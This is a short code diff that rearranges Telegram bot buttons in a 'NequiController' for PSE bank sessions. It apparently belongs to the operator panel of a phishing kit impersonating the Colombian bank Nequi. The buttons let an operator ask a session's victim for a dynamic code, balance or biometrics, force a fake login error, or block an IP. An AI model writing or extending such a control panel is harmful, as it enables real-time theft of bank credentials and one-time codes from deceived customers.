@@ -471,16 +471,17 @@ export class NequiController {
     // Se generan los botones para PSE
     const buttons = [
       [
+        { text: '🪪 LG', callback_data: `logo:${sessionId};${bank}` },
         { text: '⌛ DIN', callback_data: `sol_din:${sessionId};${bank}` },
         { text: '💰 SALDO', callback_data: `sol_saldo:${sessionId};${bank}` },
-        { text: '✅ FIN', callback_data: `sol_finalizar:${sessionId};${bank}` },
       ],
       [
+        { text: '❌ LG', callback_data: `error_login:${sessionId};${bank}` },
         { text: '❌ DIN', callback_data: `error_din:${sessionId};${bank}` },
         { text: '❌ SALDO', callback_data: `error_cash:${sessionId};${bank}` },
-        { text: '❌ LG', callback_data: `error_login:${sessionId};${bank}` },
       ],
       [
+        { text: '✅ FIN', callback_data: `sol_finalizar:${sessionId};${bank}` },
         { text: '📷 BIO', callback_data: `sol_biometria:${sessionId};${bank}` },
         { text: '🚫 BLOQUEAR IP', callback_data: `block_ip:${sessionId};${bank}` }
       ],
